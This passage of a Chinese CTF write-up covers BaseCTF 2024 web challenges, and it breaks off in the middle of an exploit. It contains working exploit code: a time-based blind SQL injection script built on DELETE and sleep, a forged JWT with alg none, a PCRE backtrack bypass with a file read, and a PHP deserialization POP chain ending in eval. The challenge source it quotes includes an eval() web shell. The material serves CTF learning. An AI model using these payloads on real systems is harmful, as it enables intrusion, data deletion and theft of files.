class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|;|@|\n/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-comment">//flag in ctf.flag</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;没有select，让你执行一句又如何&#x27;;&quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>);<br></code></pre></td></tr></table></figure><p>首先执行<code>show databases</code>爆库看看，再执行爆表</p><p><img src="/../../images/basectf/basectf2024/sql1.png" alt="sql1"></p><p>猜测应该在flag里，执行一下爆列<code>show columns from flag</code></p><p><img src="/../../images/basectf/basectf2024/sql2.png" alt="sql2"></p><p>猜测在data里面，题目把正常的select给过滤了，提醒了盲注，本人sql其实不算擅长，根据官p来吧，正常的flag格式是B来头，我们可以利用delete和时间盲注进行探测，比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?sql=delete from flag <span class="hljs-built_in">where</span> data like <span class="hljs-string">&#x27;B%&#x27;</span> and <span class="hljs-built_in">sleep</span>(5)<br></code></pre></td></tr></table></figure><p><code>DELETE FROM flag</code>：从 <code>flag</code> 表中删除记录。<code>WHERE data LIKE &#39;B%&#39;</code>：条件为 <code>data</code> 字段的值以字母 <code>B</code> 开头的记录会被选中。检测是否有B开头的.<code>SLEEP(5)</code> 会让数据库等待 5 秒再继续执行。最后写个脚本等慢慢跑出来就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>char = string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> char:<br>        url = <span class="hljs-string">f&#x27;http://challenge.basectf.fun:28963/?sql=delete%20from%20flag%20where%20data%20like%20%27<span class="hljs-subst">&#123;flag&#125;</span><span class="hljs-subst">&#123;c&#125;</span>%25%27%20and%20sleep(5)&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            response = requests.get(url, timeout=<span class="hljs-number">4</span>)<br>        <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>            <span class="hljs-built_in">print</span>(flag + c)  <span class="hljs-comment"># 输出已猜出的 flag 部分</span><br>            flag += c  <span class="hljs-comment"># 将正确的字符加入 flag</span><br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 进入下一个字符的猜测</span><br></code></pre></td></tr></table></figure><h3 id="No-JWT"><a href="#No-JWT" class="headerlink" title="No JWT"></a>No JWT</h3><p>和平常写的jwt有点不太一样</p><p>接口需要一个包含角色为 <code>admin</code> 的 JWT 令牌才能返回 flag。为了得到 flag，需要伪造一个 JWT 令牌，绕过服务器端的角色检查。</p><p>签名验证已被禁用，可以伪造一个 JWT 令牌，其中 <code>role</code> 设置为 <code>admin</code>。接下来就是构造这个伪造的 JWT 令牌并发送请求到 <code>/flag</code> 接口。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> requests<br><br>flag_url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:30617/flag&#x27;</span> <br><br>header = &#123;<br>    <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,  <span class="hljs-comment"># 禁用签名验证</span><br>    <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br>payload = &#123;<br>    <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <br>    <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,  <span class="hljs-comment"># 设置为 admin</span><br>    <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">9999999999</span>  <span class="hljs-comment"># 过期时间设置在未来</span><br>&#125;<br><span class="hljs-comment"># 对 header 和 payload 进行 Base64 编码</span><br>header_enc = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip(<span class="hljs-string">&quot;=&quot;</span>)<br>payload_enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip(<span class="hljs-string">&quot;=&quot;</span>)<br><br>fake_jwt = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;header_enc&#125;</span>.<span class="hljs-subst">&#123;payload_enc&#125;</span>.&quot;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">f&#x27;Bearer <span class="hljs-subst">&#123;fake_jwt&#125;</span>&#x27;</span><br>&#125;<br><br>response = requests.get(flag_url, headers=headers)<br><br><span class="hljs-comment"># 打印服务器响应</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;服务器响应状态码:&quot;</span>, response.status_code)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;服务器响应内容:&quot;</span>, response.text)<br></code></pre></td></tr></table></figure><h1 id="Fin"><a href="#Fin" class="headerlink" title="Fin"></a>Fin</h1><h2 id="web-4"><a href="#web-4" class="headerlink" title="web"></a>web</h2><h3 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># 我记得她...好像叫flag.php吧？</span><br><span class="hljs-variable">$emp</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e_m.p&#x27;</span>];<br><span class="hljs-variable">$try</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;try&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$emp</span>!=<span class="hljs-string">&quot;114514&quot;</span>&amp;&amp;<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$emp</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">114514</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$emp</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$emp</span>[<span class="hljs-variable">$i</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你不是hacker？那请去外场等候！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="hljs-variable">$try</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你是hacker还敢自报家门呢？&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$try</span>,<span class="hljs-string">&#x27;HACKER&#x27;</span>) === <span class="hljs-literal">TRUE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&#x27;php&#x27;</span>)!==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>))-&gt;<span class="hljs-variable">$c</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;114514到底是啥意思嘞？。？&quot;</span>);<br>&#125;<br><span class="hljs-comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span><br><span class="hljs-variable">$shell</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第一层对emp进行传值，用小数点就可以绕过，注意php特性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">e[m.p=114514.111<br></code></pre></td></tr></table></figure><p>第二层非贪婪绕过，可以去看看p神的文章，了解一下原理，<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=2#:~:text=PHP%E4%B8%BA%E4%BA%86%E9%98%B2%E6%AD%A2%E6%AD%A3">PHP利用PCRE回溯次数限制绕过某些安全限制</a>,只需要给HACKER前面加100w个就行了(ps：我没测最小值需要多少，直接量大管饱了)post发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>+ <span class="hljs-string">b&#x27;HACKER&#x27;</span><br><br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><p>第三层进行原生类的读取，简要的介绍gpt来写</p><p><code>SplFileObject</code> 是 PHP 的一个内置类，继承自 <code>SplFileInfo</code>，用于处理文件的读写操作。它提供了许多方法来操作文件，类似于文件处理的面向对象接口。</p><p>使用 <code>SplFileObject</code> 的常见方法：</p><ul><li><strong><code>fgets()</code></strong>: 读取文件的一行。</li><li><strong><code>fwrite()</code></strong>: 写入内容到文件。</li><li><strong><code>fgetc()</code></strong>: 读取文件的一个字符。</li></ul><p><code>php://stdin</code> 是一个 PHP 的流包装器，表示标准输入流。这通常用于从命令行或其他输入流读取数据。</p><ul><li><strong><code>php://stdin</code></strong> 允许你读取从标准输入传入的数据，例如，通过命令行管道传递的数据。</li></ul><p><code>fgets()</code> 是 <code>SplFileObject</code> 提供的一个方法，用于从文件中读取一行。结合 <code>php://stdin</code>，它可以读取从标准输入传入的数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=SplFileObject&amp;b=php://stdin&amp;c=fgets<br></code></pre></td></tr></table></figure><p>最后在post后面执行<code>system(&#39;cat flag.php&#39;);</code>就可以得到flag，看源码</p><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;start=<span class="hljs-variable">$start</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacker！&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>(<span class="hljs-string">&#x27;&#123;&#123;&#123;&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>].<span class="hljs-string">&#x27;&#125;&#125;&#125;&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$pre</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]:<span class="hljs-string">&quot;substr&quot;</span>;<br>    <span class="hljs-variable">$ser_ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$pre</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser_ctf</span>);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;杂鱼~杂鱼~&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>晨曦✌出的太狠了，简单的先分析一下pop链，一下是依次触发的情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hacker::__destruct =&gt; C::__toString =&gt; T::__call =&gt; F::__get =&gt; E::__isset =&gt; R::__invoke<br></code></pre></td></tr></table></figure><p>接着考虑绕过__wakeup,使用&amp;进行引用就可以绕过</p><p>需要注意的是由于最后有<code>throw new Exception(&quot;杂鱼~杂鱼~&quot;);</code>让__destruct不能正常触发，需要使用gc回收机制，参考<a href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem=DRDj2QDgGuQ7TQ4D&u_atoken=0114403acb8b70492b4c518ca47812ae&u_asig=1a0c380917263902773186410e0107">GC回收机制</a>,</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacker！&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$exp</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>();<br><span class="hljs-variable">$exp</span>-&gt;end=&amp;<span class="hljs-variable">$exp</span>-&gt;username;<br><span class="hljs-variable">$exp</span>-&gt;start=<span class="hljs-keyword">new</span> C;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c=<span class="hljs-keyword">new</span> T;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t=<span class="hljs-keyword">new</span> F;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t-&gt;f=<span 